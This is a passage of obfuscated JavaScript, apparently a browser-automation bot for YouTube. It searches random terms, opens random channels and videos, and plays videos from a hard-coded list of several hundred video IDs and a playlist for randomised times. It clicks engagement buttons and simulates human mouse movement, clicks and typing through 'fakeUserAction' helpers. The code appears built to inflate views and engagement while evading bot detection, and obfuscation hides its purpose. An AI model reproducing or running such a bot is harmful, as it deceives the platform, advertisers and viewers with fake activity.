          return await wait(0x5cc * -0x1 + 0xb9 * 0x31 + -0x1 * 0xa15), await Z['waitForNet' + 'workIdle']({
            'idleTime': 0x1d4c,
            'timeout': 0x0
          }), -0x215b + -0xfa7 * -0x2 + 0x1 * 0x20e;
        }
        async function z(Z) {
          log('watching..' + '.'), await Z['evaluate'](() => {
            const aJ = b;
            var a1;
            (a1 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + aJ(0x12, 'DTRa') + '--loaded'))['slice'](-0x4 * 0x602 + -0x1a3c + -0x1 * -0x3244, 0xb91 + 0x11de * -0x1 + 0x3c * 0x1b), a1[Math['floor'](Math['random']() * a1['length'])])['setAttribu' + 'te']('id', '__scope');
          }), await v('#__scope', 0x7ad + 0x92 * -0x26 + 0x1 * 0xdff, Z), await y(Z);
          const a0 = await A(Z);
          return await wait(min((-0x1896 + -0x2443 + -0x12739 * -0x1) * getRandomInt(0xcc2 * -0x1 + 0x1f1e + -0x125a, -0x1b25 * 0x1 + 0x2 * -0x68b + 0x2840), a0)), -0x6 * 0x128 + -0x25c2 + 0x2cb3;
        }
        async function A(Z) {
          return await Z['evaluate'](() => {
            const a0 = {
              'Seconds': 0x3e8,
              'Minutes': 0xea60,
              'Hours': 0x36ee80,
              'Second': 0x3e8,
              'Minute': 0xea60,
              'Hour': 0x36ee80
            };
            let a1 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
              a2 = -0x1cd3 + 0x1 * -0x15b2 + 0x9 * 0x59d;
            a1 = a1['split'](a1['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1 * 0xc2e + 0x1 * -0x1bc4 + 0x1e7 * 0x15]['split']('\x20');
            for (let a3 = -0x2 * -0xd3b + 0x1 * -0x314 + -0x1762; a3 < a1['length']; a3 += -0x15d7 + 0x25a1 + -0xfc8)
              a2 += a1[a3] * a0[a1[a3 + (0x13ad + -0x30 * -0x8e + 0x1726 * -0x2)]];
            return a2;
          });
        }
        async function B(Z) {
          log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await Z['goto'](channels['random'](), {
            'timeout': 0x0
          }), await v('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', -0x1f73 + -0xc4b + -0x16 * -0x1fd, Z), log('clicked\x20vi' + 'deo\x20stuff'), await y(Z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await Z['evaluate'](() => {
            const aK = b,
              a2 = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](a4 => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == a4['getAttribu' + 'te']('class'))['slice'](-0x233b + 0xddb * -0x1 + -0x4 * -0xc47)['map'](a4 => Array['from'](a4['children']))['flat'](-0x2 * 0x5 + -0x111b * -0x2 + 0x222b * -0x1)['map'](a4 => a4['childNodes'][-0x2451 + 0x2 * -0x1d0 + 0x27f2]['childNodes'][0x92 * 0x21 + -0xd * 0x2b3 + 0x1045]['childNodes'][-0x166d * -0x1 + 0x1f * -0x13d + 0xff7]['childNodes'][-0x248c + 0x2b * 0xe3 + -0x195][aK(0x1a, 'znu8')][0x7c9 * 0x2 + -0x1056 + 0xc5]);
            var a3;
            return (a3 = a2)[Math['floor'](Math['random']() * a3['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), a2['map'](a4 => a4['href']);
          }), await wait(getRandomInt(-0x1 * 0x5e5 + -0x3 * -0xf4 + -0x6f1 * -0x1, -0xa07 + -0xef9 * -0x1 + -0x74b * -0x2)), await v('#__hookedV' + 'idToWatch', 0x167e + -0xd40 + -0x93d, Z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(0x61ca + 0x205b + -0x581 * 0xd);
          const a0 = await A(Z),
            a1 = min((0x1061e + 0x3d * -0x4f7 + 0x1131d) * getRandomInt(0x1aa0 + 0x392 * 0x7 + 0x24 * -0x16f, -0x3 * -0x4ee + 0x1d4 + -0x1099), a0);
          return log('Watching\x20v' + 'id\x20for\x20' + a1 + ('ms,\x20max\x20ti' + 'me:\x20') + a0 + 'ms'), await wait(a1), 0x8 * 0x38 + -0x1b * -0xf4 + 0x1d5 * -0xf;
        }
        async function C(Z) {
          return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await Z['waitForSel' + 'ector']('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await Z['evaluate'](() => {
            const aL = c;
            var a0;
            (a0 = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](a1 => 'contents' != a1['id']), a0[Math['floor'](Math['random']() * a0['length'])])['children'][-0x456 * 0x1 + -0x1 * 0xa01 + 0xe57][aL(0x21)][0x1c49 + 0x1ccc + 0x3 * -0x1307]['children'][-0x33d * -0x1 + -0x196 * 0x2 + -0x11]['children'][-0x1 * -0xfa6 + 0x20 * 0x2f + -0x1586]['children'][0x1c79 + 0x3ab * -0x9 + 0x48a]['setAttribu' + 'te']('id', 'gottemezez');
          }), await v('#gottemeze' + 'z', -0xd28 * 0x1 + -0x4cd + -0x2 * -0x8fb, Z), await y(Z), await z(Z), 0xf3c + 0x59 * 0x18 + -0x1793;
        }
        async function D(Z) {
          log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await Z['evaluate'](() => {
            let a2 = Array['from'](document['querySelec' + 'torAll']('#search'));
            document['getElement' + 'ById']('__searchBo' + 'xReal') || a2['find'](a3 => 'INPUT' === a3['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
          }), await v('#__searchB' + 'oxReal', -0x1 * 0x1ee9 + -0x1e9 * 0x1 + 0x20d2, Z), await q['simKeyboar' + 'dType'](searchTerms['random']() + ''), await v('#search-ic' + 'on-legacy', 0x1822 * 0x1 + -0x3 * 0x429 + -0xba7, Z), log('searching.' + '..'), await Z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await y(Z);
          let a0 = await Z['evaluate'](() => {
            const a2 = {
                'seconds': 0x3e8,
                'minutes': 0xea60,
                'hours': 0x36ee80,
                'second': 0x3e8,
                'minute': 0xea60,
                'hour': 0x36ee80
              },
              a3 = (a4 = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](a6 => a6['childNodes'][0x182b + 0x1944 + 0x1 * -0x316d]['childNodes'][-0x1 * 0x1ed + 0x1bfa * 0x1 + -0x1a0c]['childNodes'][-0x2 * -0x249 + -0x3 * -0x538 + -0x1 * 0x1439]))[Math['floor'](Math['random']() * a4['length'])];
            var a4;
            const a5 = a3['childNodes'][0x827 + 0x160c * -0x1 + 0xd * 0x112]['childNodes'][0x257f + -0x12d0 + 0x1 * -0x12af]['childNodes'][0x22cb + 0x83f + 0x144 * -0x22]['ariaLabel'];
            return a3['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
              function(a6) {
                let a7 = a6['split'](',\x20')['map'](a9 => a9['split']('\x20'))['flat'](0x3 * 0xc5d + 0xb7 * 0x30 + -0x4766),
                  a8 = 0x2570 * 0x1 + 0x29 * -0x6d + 0x13fb * -0x1;
                for (let a9 = 0x955 + -0x1ecb + 0x52 * 0x43; a9 < a7['length']; a9 += 0x24fe + -0x1bfd * -0x1 + -0x40f9 * 0x1)
                  a8 += a7[a9] * a2[a7[a9 + (-0x1c78 + 0x67 * 0xe + 0x16d7)]];
                return a8;
              }(a5);
          });
          await v('#__hookedV' + 'idToClick', -0x649 + -0x2 * -0xb9e + -0x10f3, Z);
          let a1 = min((-0x773 * 0x1f + -0x714e * -0x3 + 0x7d63) * getRandomInt(0x1 * -0x1412 + 0x100 * 0x8 + 0x119 * 0xb, -0x9 * -0xdf + 0x1f7f + -0x274c), a0 + (0x66e * 0x3 + 0xc17 * -0x1 + -0x4d * -0x29));
          return log('watching\x20v' + 'ideo\x20for\x20' + a1 + 'ms'), await wait(a1), -0x1 * -0x2471 + -0x1082 + -0x9f7 * 0x2;
        }
        const E = [
          'eHpl-BjXo5' + '8',
          '-PgyODlV6V' + '8',
          'S9EkXX0QYD' + 'U',
          'WvcG1OKdHW' + 'o',
          'b6gOcEwtZ8' + 'U',
          'apdtzA0Dzf' + 'k',
          'YiukDwYv2K' + '4',
          'zK-6UH5R5X' + '8',
          'bIXqNjtsEf' + '4',
          '3l253rESkw' + 'Q',
          'u6RVZKcN9z' + 'Q',
          '6ImZdwpdwT' + 'A',
          '0qPB5ANSBK' + 'c',
          '92duH3cqn1' + 'M',
          'b5lKI78fw3' + 's',
          'zpCCPZfP8L' + 'I',
          'ES7oooakr-' + 'c',
          '2eWyJ8FBvQ' + '8',
          'O4-B3OFPDf' + 'Q',
          'JFcnGk0_u7' + 'o',
          'AP7d2Ghq6d' + 'U',
          'UizEAwrZAG' + 'I',
          '0FAi5-h8Hj' + '0',
          'CNqA6IYj17' + 'k',
          'tSiKyCpwnS' + 'Y',
          'OrglyeV5xP' + 'Y',
          'BXkB-g4eCc' + 's',
          'Y53CmmpbOJ' + 's',
          'sm5MLz_IrQ' + 'k',
          'EuciRU_Ska' + '0',
          'cCbDCTLyPc' + 'E',
          'Ox7Ng5T7bm' + 'c',
          'TXTaB-dQg-' + '0',
          '3jSWaWgr_A' + '0',
          'xT8nvuxCRB' + 'E',
          '3c4Ab9EmRg' + 'Y',
          '2kScgeNOpL' + '8',
          't22jhowMom' + 'c',
          'HbcDLgkmXL' + 's',
          'JsKZ41uTeg' + 'c',
          'dfU48FRgs0' + 'g',
          '3K9ILewnUk' + 'o',
          'QmKwnRiKhD' + 'k',
          'n3nVsWsL6I' + 'k',
          'noTs52D_Mw' + 'Y',
          'A0tDR4nTTK' + '0',
          '9eBwFca-B1' + '4',
          'moasU30H5l' + 'A',
          '_Mb8oQtSBW' + 'E',
          'TNGGOgwPtc' + 'M',
          '-pYA-gjkQ8' + 's',
          '5d-dB6tZZA' + 'o',
          '8H2AiOV0oE' + 'o',
          'mI7aiKDGde' + 'w',
          'D-IMDYrj35' + '4',
          'gKgFiEgghy' + 'g',
          'mjVwfjJ2nj' + 'k',
          '6auDBi-D2H' + 'M',
          'X89-SWNdIE' + 'k',
          'T5Pn4LhIwj' + 'M',
          'wVnKGSjY3i' + '8',
          'g11NJftxw1' + '4',
          '9zHirkfEKk' + 'k',
          'ZyGS_AMbIa' + '4',
          'yG6bwB17ZP' + 's',
          'aytHiLe0s6' + 'U',
          'cGe-Mpw_F1' + 'w',
          'eMK7xV_nxZ' + 'o',
          'epJ2MAKa1Y' + 'Q',
          '5BNbKKMUhE' + 'o',
          'oxpAvc6tDP' + '8',
          'jRcc-NIR2R' + 'I',
          '258btO4mFw' + '4',
          'pXjJAUvSbQ' + 'A',
          '63-irfPjh2' + 'c',
          'xbrDZAFf3Q' + 's',
          'MVHMtRlesU' + 'g',
          'zed05qfHMB' + 'I',
          'nkhkxKUHsY' + 'g',
          'n4cSAqR9H1' + 'Q',
          'gOUPndcj7z' + 'I',
          'n3HBTTDHoX' + '8',
          'XIgMFHPIXv' + '4',
          'oQHKMky-_K' + 'c',
          'zfDgTzZ2nh' + '0',
          '1PYettRo-D' + 'M',
          'jzuZuwF490' + '4',
          '2DAgWTlXae' + '8',
          'keouUYA5hI' + 'k',
          'F7i7wRlGCd' + 'c',
          'uToD2c0CdJ' + 'c',
          'Y8DzpdFZZ8' + '8',
          '-rrH657DAa' + 'o',
          'QTrEEWtDks' + '4',
          'TWTSnQDuad' + 'Y',
          'a0GUyvgnzg' + 'c',
          'eSReWZQyKd' + 'E',
          'D_5pMqdKSs' + '4',
          'm0ie8gHS00' + 'I',
          '6WosqMq9ej' + 'o',
          'i0afAOlon_' + '4',
          'j_fe6PfxW4' + 'Y',
          'GfPzi8SYr0' + 'w',
          'MSgZhNCwff' + 'M',
          'wxyBC_z6bI' + '8',
          'PkQpV-Fwhs' + 'k',
          'bVD6cWOVhN' + 'U',
          'mjZOpQlHbx' + 'M',
          'k_BXkcdbBO' + 'M',
          'X72oUsFV7q' + '0',
          'lONsILfq-W' + 'Y',
          'Bhe9PyM_s_' + 'Q',
          'Bhe9PyM_s_' + 'Q',
          'h4TBnDkX4y' + 'o',
          'PNBJyHEkfk' + '4',
          'L3iHS__ufc' + 'g',
          'm7aliUAwm_' + 'Y',
          'FuPVf85zMi' + 'w',
          'gtupAeNTDS' + 'M',
          aM(0x20) + '8',
          'ZDTESiN1eS' + 'w',
          'Fo6x16DkoR' + 'o',
          aN(0x26) + 'k',
          'KAgwII8TGj' + 'o',
          'o4tLCshmlb' + 'M',
          'dLj5fIupdA' + 'o',
          '_Xl_-b9P4U' + 'Q',
          'V3NxxpUUfW' + 'E',
          aM(0x27) + 'w',
          'HcP_xmdwsl' + 'c',
          'M9g0h7px2_' + 'M',
          'b5WfUvcSgr' + 'U',
          'JGHnIshsoC' + 'E',
          'x2gfhCLHd9' + '4',
          'M5Fr8G0ma9' + 'o',
          aN(0x1c) + 'M',
          'k74y4KOJ2m' + '4',
          'pTHJB0S8E-' + 'U',
          'KaIrXJLfYP' + 'M',
          '0cisZkywhg' + 'Q',
          '0dVzItbl9E' + 'w',
          't0EqnhcSb1' + 's',
          'MuiXtvo1RY' + 'E',
          'Nj-3KC6knH' + 'w',
          'B19HbETNi5' + '8',
          'yKN_QkroH6' + 's',
          'U9ExFM1pji' + '0',
          'sONzDfjKhL' + '4',
          'n3Kj8zEfew' + 'U',
          'nXLGQ7QeoG' + 'Y',
          'OQFQiwiM-P' + 'Y',
          'UtPRpKRTtH' + 'U',
          'E56Myp0BzE' + 'E',
          '7DjOp_JM2Z' + 'w',
          'rNFLQFz_G1' + 'g',
          aO(0x25, 'tq8O') + 'M',
          'gm3eiv6UND' + 'M',
          'yOiROfjxzX' + 'o',
          'lt2AcxC_ap' + 'g',
          'bObEme2BDO' + 'E',
          '6Ut6HbJmW4' + 'w',
          'fUs0TtQQTo' + '0',
          '_phHS3FAgW' + 'Q',
          '1f8sU4l3dP' + '4',
          'HwTSLUd53K' + '8',
          'EpP2ymD_QG' + 'A',
          'TQ69QFqmbo' + 'I',
          'wA8BqUka_u' + '0',
          'bc8Ey-vuR5' + 'M',
          'PZ_uLi7ULl' + '0',
          'smu5FsnhwF' + '4',
          'dv1JluwoOb' + 'c',
          'nHotP0jbcv' + 'A',
          'iIjYNEmrVv' + 'M',
          'SeP-OZAiPb' + 'c',
          'v52PClvMFt' + 'k',
          '3loLqIPxTS' + '0',
          'jVu9mOzbSq' + 'U',
          '73SAN1vOrV' + 'k',
          'YLPxp4ntym' + 's',
          'YWXfelRk3b' + 'Q',
          'CsxlLMb6Uj' + 'o',
          'uafGOfwzpa' + 'Q',
          'XIr8qotHOI' + 'E',
          'EcoPCWC3Uh' + 'o',
          'AhOwyT8aIh' + 'g',
          't-Ox7lI5UH' + 's',
          'i08qNmssXe' + 'Q',
          'QrJIU09eD-' + 'g',
          'QvNNCQ-8Rp' + 'E',
          'k5gjnjDFAZ' + 's',
          'h_NQ3y1ek8' + 'U',
          'evPsJlNLy_' + '4',
          'qEPTydgwh4' + 's',
          'LB685ckhuf' + 'E',
          'Lj1EcSMGey' + '0',
          'OE19r7MIMW' + 'Q',
          'u8E3p0Vy-P' + 'Y',
          'f4a5OPFQa7' + 'k',
          'XDo7Q7yUEt' + 'k',
          'Vw_9zw0qHI' + 'c',
          'KGT5nbDsI_' + '8',
          'E008Eql59M' + 'Q',
          'wSOFdefX47' + 'A',
          '2xcv7q3QhR' + 'E',
          'hgfvmcBkc0' + '4',
          '0wP7csnX7k' + '4',
          'Xo0R8WiRSb' + '4',
          '8zNp8EOpGd' + '4',
          'sWYhIJZmoS' + 'E',
          'YdG8U1W-bX' + '0',
          'QeDsoSNml-' + 'c',
          'xW5q77El0x' + '8',
          'ZF14issJFE' + 'Y',
          'TRglEGLLKX' + 'o',
          'UE0SXc5k1e' + 'g',
          '6VY65D8f3D' + 'Q',
          'Iwxuob4fA8' + 'Q',
          'M4elJHCUIi' + 's',
          'GY9WWhO504' + 'k',
          'eErUSxmLDw' + '8',
          'ITQfAfzLj3' + 'I',
          'vbDrCL2FuL' + 'g',
          'KyQ_sUgtbK' + 'U',
          'lbEJcipUp8' + 'I',
          '2SqCn2LreN' + 'g',
          aN(0x1e) + '0',
          's0ru6uK7vi' + '8',
          'gOxiE5UAAD' + 'w',
          'lx1rOOjekc' + '8',
          '5VYN2zA-Si' + 'k',
          'q9rLWEAzoo' + 'k',
          '4KSm3IY7Xz' + 'g',
          'fMqRu_ON-D' + 'E',
          'GfvShU6Sy9' + 'A',
          'OHzOmi1b60' + 'Y',
          'D9oTUKT-_n' + 'A',
          aM(0x1d) + '0',
          'kuuI4LzKgm' + 'I',
          '78dymyg88r' + 'M',
          'mi0nGt2B-q' + 'o',
          'HaI7BjnwnO' + 'c',
          'xlAEOkIuy7' + 'Y',
          '3VmtckvTXl' + 'U',
          'ed7TWHKDr4' + 'E',
          '2LfTjyVtbf' + 'U',
          'STHlCkloyv' + 'E',
          '-BI_-6YnM6' + 'Y',
          'LSK_G1qCQw' + 'M',
          '4tzqIl6EKV' + 'k',
          '9DshU55EiV' + '8',
          'mBtaEI_6e8' + 's',
          '960lvuduwY' + 'w',
          'XWJH-6J5Ee' + 'g',
          'XLS4qmyCAX' + 'g',
          '8cJDYeRiLn' + 'k',
          'cCaIVrltHz' + 'w',
          '8X2fF4pgM0' + 'E',
          '6s8Xm4wylr' + '4',
          'eFceshvavn' + 'o',
          '2h4g7euqR-' + 'U',
          'ujiBqXnn92' + '8',
          'w9F2NST-9j' + 's',
          'w-oc7F5Mmy' + 'U',
          'UYrmqL3cOD' + 'U',
          '4QB59etj0I' + 'o',
          'MY9MTNgXcN' + 'o',
          'ISBmcKDS5C' + '8',
          'ogIb7A7tvW' + '0',
          '-L583IZF6s' + 'k',
          'NbeKQq29ZL' + '0',
          'SPplDxd74F' + 's',
          'MHGV8QmpAz' + 'k',
          'iWzezFWpU7' + 'A',
          'NNCQt1rXXE' + 'Y',
          'bcb_ZhJJK8' + 'g',
          '3KoZGQiY6N' + 'o',
          'aSaXQH8F1_' + 'A',
          'V5nMOhI62o' + 'w',
          'JvlPjRUdId' + '0',
          '2gQHuClLCb' + '0',
          '5e-qDy-uUJ' + 'E',
          'oE8vC0QEWU' + 'E',
          '7cQken99yu' + 'o',
          'pmzu080j7r' + 'I',
          'sVy9F4whP6' + 'o',
          'MJrkylk7iE' + 'c',
          'XYjsTxi6oE' + '8',
          'mKlMouB6tp' + '0',
          'o2yunZQley' + 'A',
          'oRryU9F9Lv' + 's',
          'uzzK-052H0' + 'c',
          'VSvA4rCe-4' + 'M',
          'XURH2u_0fM' + 'I',
          'yfpVL2g_tk' + 'o',
          'AuEEjQ8x9o' + 'w',
          'wWkviY8zBr' + 'c',
          'zt_eubHWhx' + 'c',
          'O_7_BGU3u_' + '0',
          'QFDKBxmOn3' + 'Y',
          'w6gccNWXXv' + 'g',
          'VdNJxbrqdX' + 's',
          'wbi5Dxebvn' + 'I',
          'XEFOREYrJg' + 'k',
          'I2rcRta7WJ' + '0',
          'OP5KGfXHX_' + 'A',
          'w2MUMbbwlm' + 'o',
          'X3bF0nd6kf' + 'w',
          'WDDAhASf9j' + 'w',
          'fRwcV8gjbc' + 'w',
          '7T63gaRThr' + '0',
          'zC8AWIwhbf' + 's',
          'JSkVE0n-ee' + 'o',
          'qiQA5pWWRt' + 'U',
          'QdXCjZtfXu' + 'c',
          'vlBji8TOax' + 'o',
          'pBx_5CbIcp' + 'o',
          'L1Oy5F6ZMO' + 'Q',
          'P0NjLaBed-' + 'E',
          'DR16C4-keB' + '0',
          'LGmpIpu9eD' + 'w',
          'rNkX_A4kBA' + 'Q',
          'QztVMjrEk4' + '0',
          'uOM6m6KL5d' + '4',
          'g-Aju8xrrO' + 'E',
          'DfkDbFk_x9' + '8',
          'Y4NLDaowD6' + 'I',
          'ALSZnqQTuJ' + 'o',
          'xUmB6BpZBE' + 'w',
          'SxNOcZ1s85' + '8',
          '-noeCjO416' + 'k',
          'taPJqXBI8V' + 'Y',
          'YxqbkMi1Is' + '4',
          'vnJTyve2r-' + '4',
          '44lRVYQ38E' + 'Q',
          'QOv1N1X5J-' + 'g',
          'jNjREs7ODT' + 'g',
          aM(0x11) + 'k',
          'rm7lNIIOQC' + 'Y',
          'mGU6sOPlYv' + 'c',
          '6pwxUXdt6T' + 'Q',
          '6MkJRee35a' + 'Q',
          'LVbf7U9WAI' + 'c',
          'gPbhFvEeJ3' + 'M',
          'LWXAxz0MiH' + 'A',
          'L0KQJqfwJJ' + 'Y',
          'GWr33_u0VK' + 'c',
          '4ud3ZPfWkH' + 's',
          'dxSrySC4XM' + 'c',
          'iIM2KZC69W' + '0',
          '8DuJ3BAwME' + 'o',
          'm3BAhe1wsl' + 'Y',
          '02U_3pAZxM' + '8',
          '0e7nidPa97' + 'g',
          'TixW__6Eer' + 'o',
          'q46W8MTRTC' + 'E',
          'Jdxp04Je1O' + 'w',
          'HfP4TO3gfN' + '0',
          '4dUJaeB0qL' + '8',
          'xnL-fRJ3RZ' + 'o',
          'yJbD0Df45u' + 'Q',
          '-pGw8RkSSB' + 'k',
          '7cy86Njsis' + 'M',
          'jbgqvxtauo' + '4',
          'N8M00JjSVI' + 'I',
          'MfR5q6Td3R' + 'c',
          'eHwcx94wcp' + 's',
          'olDgVFgAgP' + 'o',
          'eAAd5BmzXz' + 'M',
          'xgTjQ2sGXd' + '4',
          'ipny6JUbzw' + 's',
          'WOwQ0UxbRj' + '4',
          'h0PKFed2GB' + 's',
          'JxdOrgzq7Z' + '8',
          '-VgpSWWW-8' + 'w',
          '-ix4OizkAn' + 's',
          'd3CRE9y3YV' + 's',
          '4QZlfXxorJ' + 'o',
          'YlDpg8aCs5' + 'M',
          'Qe5WT22-AO' + '8',
          'b_rjBWmc1i' + 'Q',
          '9yjZpBq1XB' + 'E',
          'hPx-RiBKXt' + 'Q',
          'UMqLDhl8PX' + 'w',
          'DlJEt2KU33' + 'I',
          'BWeqoARup-' + 'Q',
          '2Dx76lD8Sc' + 'c',
          'j_nI6G3ZDi' + 'E',
          'zvcUYYN1sx' + 'w',
          'cWRkYo1S3L' + '4',
          'cWRkYo1S3L' + '4',
          'bxC_PN3SRv' + 'I',
          '94m93T_5JL' + 'M',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'RBSHAH4iWU' + '8',
          'bo9fTeXvSi' + 'A',
          'z6LqXiAK-8' + '0',
          '5tbOspjJ5f' + '0',
          'twQ6kKjtBk' + 'Y',
          'Ig17K38Fy0' + 'Y',
          'ZdlrVDwn_a' + '4',
          'aCT4Lddunx' + 'g',
          'acAvMGQtln' + 'M',
          aO(0x1f, 'A]rI') + '0',
          '0e3GPea1Ty' + 'g',
          'zxYjTTXc-J' + '8',
          '9bqk6ZUsKy' + 'A',
          'plSyrHqUh7' + '8',
          'HkvQywg_uZ' + 'A',
          'lADBHDg-Jt' + 'A',
          'I2O7blSSzp' + 'I',
          'kd2KEHvK-q' + '8',
          'CbUjuwhQPK' + 's',
          'fb7T1v_VHp' + 'E',
          'SpeSpA3e56' + 'A',
          'RQdxHi4_Pv' + 'c',
          'nx2-4l4s4N' + 'w',
          'tUTCq3iiw_' + '4',
          'VDa5iGiPgG' + 's',
          'S-sJp1FfG7' + 'Q',
          'Hm1YFszJWb' + 'Q'
        ];
        async function F(Z) {
          const aP = c;
          await Z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + E['random']() + ('&list=PL7D' + aP(0x2) + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await v('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', 0x99a * 0x1 + -0x2670 + 0x1cd7, Z), await v('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', 0xe9 * 0x17 + -0xabb * 0x1 + -0xa33, Z);
          const a0 = setInterval(async () => {
            log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await Z['evaluate'](() => {
              setTimeout(() => {
                document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
              }, -0x10f * -0x4 + -0xd7 * 0x1d + -0x27 * -0xd1 + (-0x113c + -0x31 * 0x9a + 0x329e) * Math['random']());
            });
          }, -0x2cf * -0x11 + 0x1 * 0x129b + -0x2702);
          await wait(0x2f93a + 0x2 * -0x3aa1e + 0x7ff * 0x11e);
          try {
            Z['$']('#__lllll') && await v('#__lllll', -0x6df * 0x1 + -0x1 * 0xd03 + -0x6a1 * -0x3, Z);
          } catch (a1) {}
          return await wait((-0x5cd4 + -0xfec + -0x3d0 * -0x5a) * getRandomInt(0x3 * 0x483 + 0xc1b + -0x19a0, -0x2281 + -0x1a42 + 0x3cdc)), clearInterval(a0), -0x27 * -0x34 + 0x1caa + 0x751 * -0x5;
        }
        const G = [
          D,
          B,
          C,
          F
        ];
        async function H() {
          return await wait(-0x1255 + -0x194a + 0x9 * 0x4ef + (-0x7 * 0x391 + 0x1c7 + 0x17f8) * random()), 0x23c8 + 0x1 * 0x1d29 + -0x40f0;
        }
        async function I(Z, a0, ...a1) {
          const aQ = d;
          Check['ia'](Z, Page, Frame), Check['nes'](a0), Check['all'](a1, 'string');
          let a2 = [];
          ! function a5(a6) {
            a2['push'](a6);
            for (const a7 of a6['childFrame' + 's']())
              a5(a7);
          }(Z[aQ(0x16)]());
          const a3 = 'qkdjuqwyhd' + 'uqjidwqdjq' + 'hn' + GSI++,
            [a4] = await Promise['race'](a2['map'](a6 => setWait(a6, a0, a1, a3)));
          return await a4['$']('.' + a3);
        }
        async function J(Z, a0, a1, a2 = -0x4a5 * 0x5 + -0x8 * -0x3a + 0x156a) {
          const aR = b;
          if (!Z['fakeUserAc' + 'tion'])
            return warn('Requires\x20F' + 'UA\x20hoist!');
          Check['inst'](a0, ElementHandle), Check['nes'](a1), '_click' === a1 ? await Z['fakeUserAc' + 'tion']['simClickEl' + 'ement'](a0) : '_view' === a1 ? await Z[aR(0x23, ']YGN') + 'tion']['simMouseMo' + 'veToElemen' + 't'](a0) : await K(Z, [
            'type',
            a1
          ]), a2 && a0 && await a0['dispose']();
        }
        async function K(Z, ...a0) {
          const aT = b,
            aS = c;
          if (!Z['fakeUserAc' + 'tion'])
            throw new Error('Controller' + '\x20still\x20not' + '\x20hoisted!');
          Check['cust'](a0, a1 => a1['every'](a2 => 'string' == typeof a2 || Array['isArray'](a2)));
          for (let a1 of a0)
            if ('object' == typeof a1) {
              const a2 = a1['slice'](-0x1 * 0x1795 + 0x87 * 0x23 + -0x65 * -0xd),
                a3 = a1[-0x3d * 0x9e + 0x505 + 0x20a1];
              switch (flags['debug'] && log('[DEBUG]\x20Ex' + 'ecuting\x20ac' + 'tionType:', a3, 'with\x20argum' + 'ents:', a2), a3) {
                case 'waitfunc':
                  {
                    const [a4, a5] = a2;
                    'string' != typeof a4 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + 'ure\x20here:', a2),
                    a5 instanceof Page || a5 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a5['waitForFun' + 'ction'](a4);
                  }
                  break;
                case 'waitsel':
                  {
                    const [a6, a7] = a2;
                    'string' != typeof a6 && warn('[WATCHDOG]' + '\x20FunctionS' + 'tring\x20fail' + 'ure\x20here:', a2),
                    a7 instanceof Page || a7 instanceof Frame || warn('[WATCHDOG]' + '\x20Scope\x20fai' + 'lure\x20here:', a2),
                    await a7['waitForSel' + 'ector'](a6);
                  }
                  break;
                case aS(0x19):
                  if ('string' != typeof a2[0x51 + -0xbee * 0x3 + -0xbd3 * -0x3] && (warn('[WATCHDOG]' + '\x20Text\x20fail' + 'ure\x20here:', a2), 'number' == typeof a2[0x1a90 + -0x11fa + -0x9d * 0xe])) {
                    const a8 = a2[-0x6 * 0x1c1 + 0x2 * -0x6c3 + -0x1 * -0x180c] + '';
                    warn('[WATCHDOG]' + '\x20Recoverab' + 'le\x20error,\x20' + 'state:', a2[0x12ea + 0x633 + -0x191d], a8), a2[0x12fd * 0x2 + -0x149e + 0xb * -0x194] = a8;
                  }
                  a2[0x6e0 + -0x1 * -0x5f + -0x73e] && 'object' != typeof a2[-0xa * 0x73 + 0x12b5 + -0xe36] && warn('[WATCHDOG]' + '\x20option\x20ob' + 'ject\x20failu' + 're\x20here:', a2), await Z['fakeUserAc' + 'tion']['simKeyboar' + 'dType'](a2[-0x16a3 + -0x2 * -0x25f + 0x11e5]);
                  break;
                case 'stype':
                  {
                    const a9 = a2['shift']();
                    Check['nes'](a9);
